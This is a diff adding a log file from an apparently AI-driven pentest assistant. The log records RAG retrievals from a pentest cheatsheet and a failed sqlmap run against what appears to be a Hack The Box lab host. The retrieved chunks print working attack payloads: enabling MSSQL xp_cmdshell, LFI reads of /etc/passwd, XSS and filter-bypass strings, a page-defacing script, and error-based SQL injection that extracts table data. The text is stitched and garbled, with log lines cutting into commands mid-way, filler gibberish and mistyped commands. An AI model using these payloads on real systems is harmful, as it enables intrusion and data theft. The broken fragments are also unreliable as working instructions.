+`EXEC master..xp_cmdshell <command>`
+
+> you need yo be 'sa' user
+
+#### Enabling shell commands
+
+`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_congigure 'xp_shell', 1; RECONFIGURE;`
+
+### Jenkins
+2024-05-07 11:40:29,539 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 5] (Score: 1.45) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+Can you give me some commands please | rag-data: 2.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad
+```
+
+## Web Application
+
+### Web Remote code
+
+### LFI (Local File Inclusion)
+
+Situation
+
+```
+http://<target>/index.php?parameter=value
+```
+
+#### How to Test
+
+```
+http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index
+```
+
+```
+http://<target>/script.php?page=../../../../../../../../etc/passwd
+
+```
+
+```
+http://<target>/script.php?page=../../../../../../../../boot.ini
+```
+
+#### LFI Payloads
+
+- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
+- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
+
+### encode
+
+## XSS
+
+### Reflected
+
+#### Simple test
+
+This is a simple test to see what happens, this is not a prove that the field is vuln to xss
+
+```javascript
+<plaintext>
+```
+
+#### Simple XSS test
+
+```javascript
+<script>alert('Found')</script>
+```
+
+```javascript
+"><script>alert(Found)</script>">
+```
+
+```javascript
+<script>alert(String.fromCharCode(88,83,83))</script>
+```
+
+#### Bypass filter of tag script
+
+`"  onload="alert(String.fromCharCode(88,83,83))`
+
+```javascript
+" onload="alert('XSS')
+```
+
+bla is not a valid image, so this cause an error
+
+```javascript
+<img src='bla' onerror=alert("XSS")>
+```
+
+### Persistent
+
+```javascript
+>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";
+```
+
+### PHP collector
+
+`> cookie.txt`
+`chmod 
+2024-05-07 11:44:11,936 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 10] (Score: 1.25) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+sqlmap -u http://kiosk.jupiter.htb/api/ds/query --data "{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":453}],"range":{"from":"2024-05-07T05:42:45.036Z","to":"2024-05-07T11:42:45.036Z","raw":{"from":"now-6h","to":"now"}},"from":"1715060565036","to":"1715082165036"}" --method POST
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.6.12#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:43:42 /2024-05-07/
+
+[12:43:43] [INFO] testing connection to the target URL
+[12:43:43] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
+[12:43:43] [INFO] checking if the target is protected by some kind of WAF/IPS
+[12:43:43] [INFO] testing if the target URL content is stable
+[12:43:43] [INFO] target URL content is stable
+[12:43:43] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+[12:43:43] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 3 times
+[12:43:43] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 12:43:43 /2024-05-07/
+
+bash: ,format:table,datasourceId:1,intervalMs:60000,maxDataPoints:453}],range:{from:2024-05-07T05:42:45.036Z,to:2024-05-07T11:42:45.036Z,raw:{from:now-6h,to:now}},from:1715060565036,to:1715082165036}: command not found | rag-data: mns within a table
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename')--`
+
+> remember to change **dbname** and **tablename** accordingly with the given situation
+> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename' AND dbname..syscolumns.name NOT IN('previously found column name', ...))--`
+
+#### Actual data
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename)--`
+
+> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample
+
+`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename AND name NOT IN('previously found row data'))--`
+
+#### Shell commands
+
+`EXEC master..xp_cmdshell <command>`
+
+> you need yo be 'sa' user
+
+#### Enabling shell commands
+
+`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_congigure 'xp_shell', 1; RECONFIGURE;`
+
+### Jenkins
